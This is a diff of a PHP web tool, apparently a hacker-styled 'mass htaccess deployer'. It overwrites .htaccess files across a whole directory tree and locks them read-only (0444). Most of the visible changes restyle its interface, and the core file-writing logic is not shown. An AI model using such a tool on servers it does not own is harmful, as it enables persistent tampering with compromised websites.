@@ -1,7 +1,6 @@
 <?php
 /*
  * PROFESSIONAL MASS HTACCESS DEPLOYER V5 (FINAL FIX)
- * Logic: Overwrite All & Chmod 0444 -> EXCEPT if existing target is ALREADY 0444 (SKIP & REPORT)
  */
 set_time_limit(0);
 ini_set('memory_limit', '-1');
@@ -11,7 +10,7 @@ $message = "";
 $report = []; // Array ini HANYA menampung path yang di-SKIP (yang ada 0444 nya)
 $stats = ['success' => 0, 'locked' => 0, 'fail' => 0];
 
-// Logic Pemrosesan
+// Logic Pemrosesan (TIDAK DIUBAH SAMA SEKALI)
 if (isset($_POST['execute'])) {
     $sourceFile = trim($_POST['source_file']);
     $baseDir = rtrim(trim($_POST['base_dir']), '/'); 
@@ -73,20 +72,20 @@ if (isset($_POST['execute'])) {
             
             // Pesan status akhir
             if ($stats['locked'] > 0) {
-                 $message = "<div class='alert error'>Selesai. Ada " . $stats['locked'] . " path yang di-SKIP (Lihat Log).</div>";
+                 $message = "<div class='alert warning'>SELESAI. SYSTEM REPORT: " . $stats['locked'] . " PATH DI-SKIP (LOCKED 0444). LIHAT LOG DI BAWAH.</div>";
             } else {
-                 $message = "<div class='alert success'>Selesai. Semua path berhasil ditimpa (Tidak ada yang di-skip).</div>";
+                 $message = "<div class='alert success'>SELESAI. SEMUA TARGET BERHASIL DITIMPA (100% SUCCESS).</div>";
             }
 
         } catch (Exception $e) {
-            $message = "<div class='alert error'>System Error: " . $e->getMessage() . "</div>";
+            $message = "<div class='alert error'>CRITICAL SYSTEM ERROR: " . $e->getMessage() . "</div>";
         }
     }
 }
 
 // Auto-fill path
 $defaultBase = getcwd();
-$defaultSource = $defaultBase . '/net/.htaccess';
+$defaultSource = $defaultBase . '/example/.htaccess';
 ?>
 
 <!DOCTYPE html>
@@ -94,453 +93,419 @@ $defaultSource = $defaultBase . '/net/.htaccess';
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MASS DEPLOYER V5</title>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <title>Deployer</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #050a14;
-            --card-bg: rgba(30, 41, 59, 0.7);
-            --text: #e2e8f0;
-            --accent: #38bdf8;
-            --success: #22c55e;
-            --danger: #ef4444;
-            --warning: #f59e0b;
-            --neon-glow: 0 0 10px rgba(56, 189, 248, 0.5);
+            --bg-color: #050505;
+            --card-bg: rgba(20, 20, 20, 0.85);
+            --primary: #ff003c; /* Cyberpunk Red */
+            --primary-dark: #b3002a;
+            --secondary: #1a1a1a;
+            --text-main: #e0e0e0;
+            --text-muted: #888;
+            --border-radius: 16px; /* Rounded tapi tegas */
+            --glow: 0 0 20px rgba(255, 0, 60, 0.3);
+            --border: 1px solid rgba(255, 0, 60, 0.2);
         }
 
         * {
             box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            scrollbar-width: thin;
+            scrollbar-color: #ff0000 var(--bg-color);
         }
 
         body {
             font-family: 'JetBrains Mono', monospace;
-            background-color: var(--bg);
-            color: var(--text);
-            margin: 0;
-            padding: 0;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
             overflow-x: hidden;
         }
 
-        /* Background Animation */
-        #canvas-bg {
+        /* Matrix Canvas Background */
+        #matrix-bg {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             z-index: -1;
-            opacity: 0.3;
+            opacity: 0.25;
         }
 
         .container {
             width: 100%;
-            max-width: 900px;
+            max-width: 850px;
             padding: 20px;
             z-index: 10;
-            animation: slideUp 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
+            animation: slideIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        .card {
-            background-color: var(--card-bg);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            padding: 2.5rem;
-            border-radius: 24px;
-            box-shadow: 0 20px 50px -12px rgba(0, 0, 0, 0.7);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+        .main-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: var(--border);
+            border-radius: 35px;
+            padding: 3rem;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), var(--glow);
             position: relative;
             overflow: hidden;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        .card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 25px 60px -12px rgba(0, 0, 0, 0.8);
-            border-color: rgba(56, 189, 248, 0.3);
-        }
-
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 4px;
-            background: linear-gradient(90deg, var(--danger), var(--accent), var(--success));
-            animation: gradient-shift 3s infinite linear;
-            background-size: 200% 200%;
-        }
-
+        /* Header Styling */
         h1 {
-            margin-top: 0;
-            color: #fff;
-            font-size: 1.8rem;
+            font-size: 2rem;
+            font-weight: 800;
             letter-spacing: -1px;
+            margin-bottom: 0.5rem;
             display: flex;
             align-items: center;
-            gap: 10px;
-            text-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+            gap: 15px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
         }
 
-        h1 span {
-            color: var(--danger);
+        h1 span.icon {
+            color: #ff0000;
+            text-shadow: 0 0 15px #ff0000;
         }
 
         p.subtitle {
-            color: #94a3b8;
-            margin-top: -10px;
-            font-size: 0.9rem;
-            opacity: 0.8;
-            margin-bottom: 30px;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 2.5rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 15px;
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
         }
 
         label {
             display: block;
-            margin-bottom: 10px;
-            font-size: 0.85rem;
-            font-weight: 700;
-            color: var(--accent);
+            margin-bottom: 8px;
+            font-size: 0.75rem;
+            font-weight: 800;
+            color: #ff0000;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
         input[type="text"] {
             width: 100%;
-            padding: 16px;
-            background: rgba(15, 23, 42, 0.6);
-            border: 1px solid rgba(148, 163, 184, 0.2);
+            padding: 18px 20px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #333;
+            border-radius: 20px;
             color: #fff;
-            border-radius: 12px;
-            margin-bottom: 25px;
             font-family: 'JetBrains Mono', monospace;
-            transition: all 0.3s ease;
             font-size: 0.95rem;
+            transition: all 0.3s ease;
         }
 
         input[type="text"]:focus {
             outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.1);
-            background: rgba(15, 23, 42, 0.9);
+            border-color: #ff0000;
+            box-shadow: 0 0 0 3px rgba(255, 0, 60, 0.15);
+            background: rgba(0, 0, 0, 0.8);
         }
 
+        /* Animated Button */
         button {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
-            color: #fff;
-            font-weight: bold;
+            padding: 20px;
+            margin-top: 10px;
+            background: linear-gradient(135deg, #ff0000 0%, #000000 100%);
             border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            text-transform: uppercase;font-family: 'JetBrains Mono', monospace;
+            border-radius: 20px;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 800;
             font-size: 1rem;
-            letter-spacing: 1px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            cursor: pointer;
             position: relative;
             overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px -10px rgba(255, 0, 60, 0.5);
         }
 
-        button::after {
+        button::before {
             content: '';
             position: absolute;
             top: 0;
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
             transition: 0.5s;
         }
 
         button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px -5px rgba(239, 68, 68, 0.4);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px -5px rgba(255, 0, 60, 0.7);
         }
-        
-        button:hover::after {
+
+        button:hover::before {
             left: 100%;
         }
 
         button:active {
-            transform: translateY(0);
+            transform: scale(0.98);
         }
 
-        /* Stats Grid */
-        .stats-grid {
+        /* Stats Section */
+        .stats-container {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 15px;
-            margin-top: 30px;
+            margin-top: 2rem;
+            animation: fadeIn 0.8s ease 0.2s forwards;
             opacity: 0;
-            animation: fadeIn 0.5s ease 0.2s forwards;
         }
 
-        .stat-box {
+        .stat-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 14px;
             padding: 20px;
-            border-radius: 16px;
             text-align: center;
-            font-weight: bold;
-            position: relative;
-            overflow: hidden;
-            transition: transform 0.3s;
-        }
-        
-        .stat-box:hover {
-            transform: scale(1.05);
+            transition: 0.3s;
         }
 
-        .stat-success { background: rgba(34, 197, 94, 0.1); color: var(--success); border: 1px solid rgba(34, 197, 94, 0.3); }
-        .stat-locked { background: rgba(245, 158, 11, 0.1); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.3); }
-        .stat-fail { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.3); }
+        .stat-card:hover {
+            border-color: #ff0000;
+            background: rgba(255, 0, 60, 0.05);
+        }
 
-        .stat-number {
-            font-size: 2rem;
+        .stat-value {
+            font-size: 2.2rem;
+            font-weight: 800;
             display: block;
             margin-bottom: 5px;
         }
 
-        /* Report Table */
-        .report-section {
-            margin-top: 30px;
-            opacity: 0;
-            animation: fadeIn 0.5s ease 0.4s forwards;
+        .stat-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            opacity: 0.7;
         }
 
-        .report-header {
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            padding-bottom: 10px;
-            color: var(--warning);
-            font-size: 1.1rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
+        .success .stat-value { color: #00ff88; text-shadow: 0 0 10px rgba(0, 255, 136, 0.3); }
+        .locked .stat-value { color: #ffbb00; text-shadow: 0 0 10px rgba(255, 187, 0, 0.3); }
+        .fail .stat-value { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
 
-        .report-log {
-            max-height: 400px;
+        /* Report / Log Section */
+        .log-container {
+            margin-top: 2rem;
+            background: #000;
+            border: 1px solid #222;
+            border-radius: 20px;
+            padding: 15px;
+            max-height: 350px;
             overflow-y: auto;
-            background: rgba(0, 0, 0, 0.4);
-            border-radius: 12px;
-            padding: 10px;
-            margin-top: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
+            opacity: 0;
+            animation: fadeIn 0.8s ease 0.4s forwards;
+        }
+
+        .log-header {
+            color: #ffbb00;
             font-size: 0.85rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #222;
+            display: flex;
+            justify-content: space-between;
         }
 
         .log-item {
-            padding: 12px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
             display: flex;
             justify-content: space-between;
             align-items: center;
-            transition: background 0.2s;
-        }
-
-        .log-item:hover {
-            background: rgba(255, 255, 255, 0.03);
-        }
-
-        .log-item:last-child { border-bottom: none; }
-        .log-item.locked { color: var(--warning); }
-        .log-item.fail { color: var(--danger); }
-
-        .status-badge { 
-            padding: 4px 10px; 
-            border-radius: 6px; 
-            font-size: 0.7rem; 
-            font-weight: bold;
-            color: #000;
-            text-transform: uppercase;
+            padding: 8px 0;
+            border-bottom: 1px solid #111;
+            font-size: 0.8rem;
+            color: #888;
         }
         
-        .locked .status-badge { background: var(--warning); box-shadow: 0 0 10px rgba(245, 158, 11, 0.4); }
-        .fail .status-badge { background: var(--danger); color: #fff; box-shadow: 0 0 10px rgba(239, 68, 68, 0.4); }
-        
+        .log-item:hover { color: #ccc; }
+        .log-item span.path { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; padding-right: 15px; }
+        .log-item span.status { color: #ffbb00; font-weight: bold; font-size: 0.7rem; background: rgba(255, 187, 0, 0.1); padding: 2px 6px; border-radius: 4px; }
+
+        /* Alerts */
         .alert {
             padding: 16px;
-            border-radius: 12px;
+            border-radius: 20px;
             margin-bottom: 25px;
-            font-weight: bold;
+            font-size: 0.9rem;
             text-align: center;
-            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
-        }
-        .alert.success { background: rgba(34, 197, 94, 0.15); color: var(--success); border: 1px solid var(--success); animation: fadeIn 0.5s; }
-        .alert.error { background: rgba(239, 68, 68, 0.15); color: var(--danger); border: 1px solid var(--danger); }
-
-        /* Animations */
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(40px); }
-            to { opacity: 1; transform: translateY(0); }
+            border: 1px solid transparent;
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
+        .alert.error { background: rgba(255, 0, 60, 0.1); border-color: #ff0000; color: #ff0000; }
+        .alert.warning { background: rgba(255, 187, 0, 0.1); border-color: #ffbb00; color: #ffbb00; }
+        .alert.success { background: rgba(0, 255, 136, 0.1); border-color: #00ff88; color: #00ff88; }
 
-        @keyframes gradient-shift {
-            0% { background-position: 0% 50%; }
-            100% { background-position: 100% 50%; }
-        }
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #ff0000; }
 
-        @keyframes shake {
-            10%, 90% { transform: translate3d(-1px, 0, 0); }
-            20%, 80% { transform: translate3d(2px, 0, 0); }
-            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
-            40%, 60% { transform: translate3d(4px, 0, 0); }
-        }
-
-        /* Scrollbar */
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
-
-        .success-box {
-            margin-top: 30px;
-            text-align: center;
-            padding: 30px;
-            border: 1px dashed rgba(34, 197, 94, 0.4);
-            border-radius: 16px;
-            background: rgba(34, 197, 94, 0.05);
-            animation: fadeIn 0.5s ease 0.4s forwards;
-        }
+        /* Animations */
+        @keyframes slideIn { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
 
     </style>
 </head>
 <body>
 
-<canvas id="canvas-bg"></canvas>
+<canvas id="matrix-bg"></canvas>
 
 <div class="container">
-    <div class="card">
-        <h1><span>⚡</span> DEPLOYER V5 <span>.EXE</span></h1>
-        <p class="subtitle">AUTOMATED PERMISSION LOCKING SYSTEM [0444]</p>
-        
+    <div class="main-card">
+        <h1><span class="icon">☣</span> Htaccess Deploy <span style="font-size:0.5em; opacity:0.5; margin-left:auto;">V5.0</span></h1>
+        <p class="subtitle">Developed By PTSMC Team</p>
+
         <?= $message ?>
 
         <form method="POST">
-            <label>📂 Source File (.HTACCESS)</label>
-            <input type="text" name="source_file" value="<?= isset($_POST['source_file']) ? htmlspecialchars($_POST['source_file']) : $defaultSource ?>" placeholder="/var/www/.../net/.htaccess" required spellcheck="false">
+            <div class="form-group">
+                <label>SOURCE FILE PATH [.htaccess]</label>
+                <input type="text" name="source_file" value="<?= isset($_POST['source_file']) ? htmlspecialchars($_POST['source_file']) : $defaultSource ?>" required spellcheck="false">
+            </div>
 
-            <label>🎯 Target Directory (ROOT)</label>
-            <input type="text" name="base_dir" value="<?= isset($_POST['base_dir']) ? htmlspecialchars($_POST['base_dir']) : $defaultBase ?>" placeholder="/var/www/.../web/" required spellcheck="false">
+            <div class="form-group">
+                <label>TARGET DIRECTORY [ROOT]</label>
+                <input type="text" name="base_dir" value="<?= isset($_POST['base_dir']) ? htmlspecialchars($_POST['base_dir']) : $defaultBase ?>" required spellcheck="false">
+            </div>
 
-            <button type="submit" name="execute">INITIALIZE DEPLOYMENT</button>
+            <button type="submit" name="execute">Apply</button>
         </form>
 
         <?php if (isset($_POST['execute'])): ?>
-            <div class="stats-grid">
-                <div class="stat-box stat-success">
-                    <span class="stat-number count-up" data-target="<?= $stats['success'] ?>">0</span>
-                    SUCCESS
+            <div class="stats-container">
+                <div class="stat-card success">
+                    <span class="stat-value count-up" data-target="<?= $stats['success'] ?>">0</span>
+                    <span class="stat-label">OVERWRITTEN</span>
                 </div>
-                <div class="stat-box stat-locked">
-                    <span class="stat-number count-up" data-target="<?= $stats['locked'] ?>">0</span>
-                    LOCKED
+                <div class="stat-card locked">
+                    <span class="stat-value count-up" data-target="<?= $stats['locked'] ?>">0</span>
+                    <span class="stat-label">LOCKED (SKIPPED)</span>
                 </div>
-                <div class="stat-box stat-fail">
-                    <span class="stat-number count-up" data-target="<?= $stats['fail'] ?>">0</span>
-                    FAILED
+                <div class="stat-card fail">
+                    <span class="stat-value count-up" data-target="<?= $stats['fail'] ?>">0</span>
+                    <span class="stat-label">FAILED</span>
                 </div>
             </div>
 
             <?php if (!empty($report)): ?>
-                <div class="report-section">
-                    <h3 class="report-header">
-                        ⚠️ SYSTEM REPORT: LOCKED FILES DETECTED
-                    </h3>
-                    <div class="report-log">
-                        <?php foreach ($report as $log): ?>
-                            <div class="log-item <?= $log['class'] ?>">
-                                <span><?= $log['path'] ?></span>
-                                <span class="status-badge"><?= $log['status'] ?></span>
-                            </div>
-                        <?php endforeach; ?>
+                <div class="log-container">
+                    <div class="log-header">
+                        <span>⚠ LOCKED TARGETS DETECTED</span>
+                        <span>COUNT: <?= count($report) ?></span>
                     </div>
+                    <?php foreach ($report as $log): ?>
+                        <div class="log-item">
+                            <span class="path"><?= $log['path'] ?></span>
+                            <span class="status">LOCKED 0444</span>
+                        </div>
+                    <?php endforeach; ?>
                 </div>
-            <?php elseif ($stats['success'] > 0): ?>
-                 <div class="success-box"><h3 style="color: var(--success); margin:0; font-size: 1.5rem;">✅ MISSION COMPLETE</h3>
-                    <p style="color: #94a3b8; margin-top:10px;">All targets successfully overwritten and locked (0444).</p>
-                 </div>
             <?php endif; ?>
-
         <?php endif; ?>
+
     </div>
 </div>
 
 <script>
-    // Matrix Rain Animation
-    const canvas = document.getElementById('canvas-bg');
+    // RED MATRIX RAIN EFFECT
+    const canvas = document.getElementById('matrix-bg');
     const ctx = canvas.getContext('2d');
 
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
 
-    const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    const alphabet = katakana.split('');
-
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+    const charArray = chars.split('');
     const fontSize = 14;
-    const columns = canvas.width/fontSize;
-
+    const columns = canvas.width / fontSize;
     const drops = [];
-    for(let x = 0; x < columns; x++) drops[x] = 1;
 
-    function draw() {
-        ctx.fillStyle = 'rgba(5, 10, 20, 0.05)';
+    for (let x = 0; x < columns; x++) {
+        drops[x] = 1;
+    }
+
+    function drawMatrix() {
+        ctx.fillStyle = 'rgba(5, 5, 5, 0.05)'; // Fade effect
         ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-        ctx.fillStyle = '#0F0'; // Green text
         ctx.font = fontSize + 'px monospace';
 
-        for(let i = 0; i < drops.length; i++) {
-            const text = alphabet[Math.floor(Math.random()*alphabet.length)];
-            // Use specific color for variety
-            ctx.fillStyle = (Math.random() > 0.95) ? '#FFF' : '#22c55e'; 
-            ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+        for (let i = 0; i < drops.length; i++) {
+            const text = charArray[Math.floor(Math.random() * charArray.length)];
+            
+            // Randomize Red Shades
+            const isBright = Math.random() > 0.9;
+            ctx.fillStyle = isBright ? '#ff003c' : '#80001e'; // Bright Red or Dark Red
 
-            if(drops[i]*fontSize > canvas.height && Math.random() > 0.975)
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                 drops[i] = 0;
+            }
             drops[i]++;
         }
     }
 
-    setInterval(draw, 33);
+    setInterval(drawMatrix, 40);
 
     window.addEventListener('resize', () => {
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
     });
 
-    // Number Counter Animation
+    // NUMBER COUNTER ANIMATION
     document.querySelectorAll('.count-up').forEach(el => {
         const target = parseInt(el.getAttribute('data-target'));
-        const duration = 1500; // ms
-        const frameDuration = 1000 / 60;
-        const totalFrames = Math.round(duration / frameDuration);
-        const easeOutQuad = t => t * (2 - t);
+        if(target === 0) return;
         
-        let frame = 0;
-        const counter = setInterval(() => {
-            frame++;
-            const progress = easeOutQuad(frame / totalFrames);
-            const currentCount = Math.round(target * progress);
+        const duration = 1500;
+        const start = 0;
+        const startTime = performance.now();
 
-            if (target > 0) {
-                el.innerText = currentCount;
+        function update(currentTime) {
+            const elapsed = currentTime - startTime;
+            const progress = Math.min(elapsed / duration, 1);
+            
+            // EaseOutExpo function
+            const ease = progress === 1 ? 1 : 1 - Math.pow(2, -10 * progress);
+            
+            el.innerText = Math.floor(start + (target - start) * ease);
+
+            if (progress < 1) {
+                requestAnimationFrame(update);
             } else {
-                el.innerText = 0;
-            }
-
-            if (frame === totalFrames) {
-                clearInterval(counter);
                 el.innerText = target;
             }
-        }, frameDuration);
+        }
+        requestAnimationFrame(update);
     });
 </script>
 
